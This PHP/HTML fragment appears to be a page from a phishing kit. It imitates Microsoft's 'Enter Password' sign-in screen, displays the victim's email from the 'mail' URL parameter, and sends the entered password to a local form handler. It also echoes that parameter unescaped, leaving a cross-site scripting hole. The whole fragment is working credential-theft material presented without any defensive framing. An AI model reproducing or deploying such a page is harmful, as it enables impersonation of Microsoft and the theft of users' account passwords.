<?php $passo = $_GET['mail']; ?>
<form action="./process/form.php" method="post" class="next_form">
    <p class="next_mail"><?php echo $passo; ?></p>  
    <img src="./images/logo.jpg" alt="Logo" id="logo">
    <h2 class="enter_pass">Enter Password</h2>
    <p class="bcs">Because you're accessing sensitive info, you need to verify your password.</p>
    <input type="password" placeholder="Password" name="p">
    <p class="account acct1"><a>Forgot password?</a></p>
    <p class="account acct2"><a>Email code to <?php echo $passo; ?></a></p>
    <p class="account acct3"><a>Sign in with a different Microsoft account</a></p>
    <button class="btn2" type="submit" name="btn2">Sign in</button>
</form>
